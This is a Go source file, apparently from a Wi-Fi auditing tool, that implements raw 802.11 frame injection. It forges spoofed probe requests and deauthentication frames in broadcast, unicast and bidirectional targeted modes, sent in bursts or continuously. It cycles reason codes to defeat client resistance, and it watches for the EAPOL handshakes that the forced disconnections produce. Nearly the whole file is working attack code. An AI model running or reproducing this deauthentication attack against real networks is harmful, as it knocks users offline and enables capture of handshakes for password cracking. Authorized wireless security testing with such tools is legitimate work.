package sniffer

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
)

// Injector handles active packet injection.
type Injector struct {
	Handle    *pcap.Handle
	Interface string
	mu        sync.Mutex
	seq       uint16
}

// NewInjector creates a new Injector.
func NewInjector(iface string) (*Injector, error) {
	// Open handle for injection (unpromiscuous might be enough if monitor mode is on, but we reuse the pattern)
	// Actually, we can reuse the sniffer's handle if we expose it, but separate handle is safer/simpler for now.
	handle, err := pcap.OpenLive(iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	return &Injector{Handle: handle, Interface: iface}, nil
}

// StartMonitor starts a background packet listener to detect effectiveness events.
// It sends events ("handshake", "probe") to the provided channel.
// StartMonitor starts a background packet listener to detect effectiveness events.
// It opens a separate pcap handle to avoid concurrent usage issues with the injection handle.
func (i *Injector) StartMonitor(ctx context.Context, targetMAC string, events chan<- string) {
	// Open a new handle for monitoring
	monitorHandle, err := pcap.OpenLive(i.Interface, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Printf("Monitor: Failed to open handle on %s: %v", i.Interface, err)
		return
	}
	defer monitorHandle.Close()

	// Filter: (EAPOL) OR (Probe Request from Target)
	// EAPOL: ether proto 0x888e
	// ProbeReq: type mgt subtype probe-req and wlan.sa == targetMAC
	filter := fmt.Sprintf("(ether proto 0x888e) or (type mgt subtype probe-req and wlan addr2 %s)", targetMAC)

	if err := monitorHandle.SetBPFFilter(filter); err != nil {
		log.Printf("Monitor: Failed to set BPF filter: %v", err)
		return
	}

	source := gopacket.NewPacketSource(monitorHandle, monitorHandle.LinkType())
	packets := source.Packets()

	log.Printf("Monitor: Started listening for events on %s (Filter: %s)", targetMAC, filter)

	for {
		select {
		case <-ctx.Done():
			return
		case packet, ok := <-packets:
			if !ok {
				return
			}

			// Check packet type
			// basic check if it's EAPOL
			if layer := packet.Layer(layers.LayerTypeEAPOL); layer != nil {
				select {
				case events <- "handshake":
				default:
				}
				log.Printf("Monitor: Detected HANDSHAKE for %s", targetMAC)
				continue
			}

			// Check for Probe Request
			if dot11Layer := packet.Layer(layers.LayerTypeDot11); dot11Layer != nil {
				dot11, _ := dot11Layer.(*layers.Dot11)
				if dot11.Type == layers.Dot11TypeMgmtProbeReq {
					select {
					case events <- "probe":
					default:
					}
				}
			}
		}
	}
}

// BroadcastProbe sends a Probe Request to the broadcast address.
func (i *Injector) BroadcastProbe(ssid string) error {
	i.mu.Lock()
	defer i.mu.Unlock()

	// 1. RadioTap Header (Standard 802.11 monitor mode header)
	// We use a minimal header. Drivers usually overwrite rate/flags.
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    5, // 2.5 Mbps (placeholder)
	}

	// 2. Dot11 Header (Management Frame, Probe Request)
	// Type: Management (00), Subtype: Probe Request (0100 -> 4)
	srcMAC, _ := net.ParseMAC("02:00:00:00:01:00") // Randomized locally administered
	dstMAC, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff") // Broadcast
	bssid, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")  // Broadcast BSSID

	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtProbeReq,
		Address1:       dstMAC,
		Address2:       srcMAC,
		Address3:       bssid,
		SequenceNumber: i.seq, // Use internal sequence
	}
	i.seq++

	// 3. Management Layer (Empty for gopacket, just acts as layer type holder)
	// We don't strictly need layers.Dot11MgmtProbeReq because it has no fields,
	// but providing it helps gopacket set the layer type correctly if we were parsing.
	// For serialization, Dot11 layer handles the Type/Subtype fields.

	// 4. Payload (Information Elements)
	// We must manually construct the tags:
	// - SSID (Tag 0)
	// - Supported Rates (Tag 1)
	// - DS Parameter Set (Tag 3) - Channel (Optional but good) to prevent channel hop issues?
	// - Extended Supported Rates (Tag 50)

	payload := []byte{}

	// Tag 0: SSID
	ssidBytes := []byte(ssid)
	payload = append(payload, 0, byte(len(ssidBytes)))
	payload = append(payload, ssidBytes...)

	// Tag 1: Supported Rates (1, 2, 5.5, 11 Mbps basic)
	// 0x82 (1), 0x84 (2), 0x8b (5.5), 0x96 (11) - MSB set means "Basic/Required" rate
	rates := []byte{0x82, 0x84, 0x8b, 0x96}
	payload = append(payload, 1, byte(len(rates)))
	payload = append(payload, rates...)

	// Tag 50: Extended Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
	extRates := []byte{0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c}
	payload = append(payload, 50, byte(len(extRates)))
	payload = append(payload, extRates...)

	// Serialize
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true, // GoPacket calculates FCS (CRC32) at end of Dot11
	}

	if err := gopacket.SerializeLayers(buf, opts,
		radiotap,
		dot11,
		gopacket.Payload(payload),
	); err != nil {
		return fmt.Errorf("serialize probe failed: %w", err)
	}

	if err := i.Handle.WritePacketData(buf.Bytes()); err != nil {
		return fmt.Errorf("inject probe failed: %w", err)
	}

	return nil
}

// SendDeauthPacket sends a single deauthentication frame
func (i *Injector) SendDeauthPacket(targetMAC, senderMAC net.HardwareAddr, reasonCode uint16) error {
	i.mu.Lock()
	defer i.mu.Unlock()

	// Construct RadioTap header
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    5,
	}

	// Construct Dot11 header for deauth frame
	// Deauth frames: Type 0 (Management), Subtype 12 (0xC)
	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtDeauthentication,
		Address1:       targetMAC, // Destination (receiver)
		Address2:       senderMAC, // Source (sender)
		Address3:       senderMAC, // BSSID (same as sender for deauth)
		SequenceNumber: i.seq,
	}
	i.seq++ // Increment sequence number

	// Deauth management frame with reason code
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11Reason(reasonCode),
	}

	// Serialize the packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radiotap, dot11, deauth); err != nil {
		return fmt.Errorf("failed to serialize deauth packet: %w", err)
	}

	// Inject the packet
	if err := i.Handle.WritePacketData(buf.Bytes()); err != nil {
		return fmt.Errorf("failed to inject deauth packet: %w", err)
	}

	return nil
}

// SendDeauthBurst sends multiple deauth packets according to the config
func (i *Injector) SendDeauthBurst(config domain.DeauthAttackConfig) error {
	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	count := config.PacketCount
	if count <= 0 {
		count = 10 // Default burst size
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	// Enhanced Fuzzing: Use more effective reason codes
	// 1: Unspecified
	// 2: Previous authentication no longer valid
	// 3: Deauthenticated because sending station is leaving (or has left) IBSS or ESS
	// 4: Disassociated due to inactivity
	// 6: Class 2 frame received from nonauthenticated station
	// 7: Class 3 frame received from nonassociated station
	// 8: Disassociated because sending station is leaving (or has left) BSS
	fuzzCodes := []uint16{1, 2, 3, 4, 6, 7, 8}
	fuzzIdx := 0

	for j := 0; j < count; j++ {
		reason := config.ReasonCode
		if config.UseReasonFuzzing {
			reason = fuzzCodes[fuzzIdx]
			fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
		}

		switch config.AttackType {
		case domain.DeauthBroadcast:
			// Send deauth from AP to broadcast
			broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
			if err := i.SendDeauthPacket(broadcast, targetMAC, reason); err != nil {
				log.Printf("Failed to send broadcast deauth: %v", err)
			}

		case domain.DeauthUnicast:
			// Send deauth from AP to specific client
			if clientMAC != nil {
				if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
					log.Printf("Failed to send unicast deauth: %v", err)
				}
			}

		case domain.DeauthTargeted:
			// Send bidirectional deauth (AP->Client and Client->AP)
			if clientMAC != nil {
				// AP -> Client
				if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
					log.Printf("Failed to send AP->Client deauth: %v", err)
				}
				// Client -> AP
				if err := i.SendDeauthPacket(targetMAC, clientMAC, reason); err != nil {
					log.Printf("Failed to send Client->AP deauth: %v", err)
				}
			}
		}

		if j < count-1 {
			<-ticker.C
		}
	}

	return nil
}

// StartContinuousDeauth starts a continuous deauth attack until context is cancelled
func (i *Injector) StartContinuousDeauth(ctx context.Context, config domain.DeauthAttackConfig, statusChan chan<- domain.DeauthAttackStatus) error {
	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	packetsSent := 0
	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")

	// Use same enhanced list for continuous mode
	fuzzCodes := []uint16{1, 2, 3, 4, 6, 7, 8}
	fuzzIdx := 0

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			reason := config.ReasonCode
			if config.UseReasonFuzzing {
				reason = fuzzCodes[fuzzIdx]
				fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
			}

			switch config.AttackType {
			case domain.DeauthBroadcast:
				if err := i.SendDeauthPacket(broadcast, targetMAC, reason); err != nil {
					log.Printf("Failed to send broadcast deauth: %v", err)
				} else {
					packetsSent++
				}

			case domain.DeauthUnicast:
				if clientMAC != nil {
					if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
						log.Printf("Failed to send unicast deauth: %v", err)
					} else {
						packetsSent++
					}
				}

			case domain.DeauthTargeted:
				if clientMAC != nil {
					// AP -> Client
					if err := i.SendDeauthPacket(clientMAC, targetMAC, reason); err != nil {
						log.Printf("Failed to send AP->Client deauth: %v", err)
					} else {
						packetsSent++
					}
					// Client -> AP
					if err := i.SendDeauthPacket(targetMAC, clientMAC, reason); err != nil {
						log.Printf("Failed to send Client->AP deauth: %v", err)
					} else {
						packetsSent++
					}
				}
			}

			// Send status update every 10 packets
			if packetsSent%10 == 0 && statusChan != nil {
				select {
				case statusChan <- domain.DeauthAttackStatus{
					PacketsSent: packetsSent,
					Status:      domain.AttackRunning,
				}:
				default:
				}
			}
		}
	}
}

func (i *Injector) Close() {
	if i.Handle != nil {
		i.Handle.Close()
	}
}
